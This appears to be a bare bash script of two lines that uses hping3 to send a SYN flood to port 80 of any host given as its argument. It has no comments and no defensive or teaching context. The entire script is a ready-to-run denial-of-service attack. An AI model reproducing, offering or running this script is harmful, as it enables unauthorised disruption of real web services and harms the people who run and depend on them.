#!/bin/bash
hping3 -S --flood -V -p 80 $1
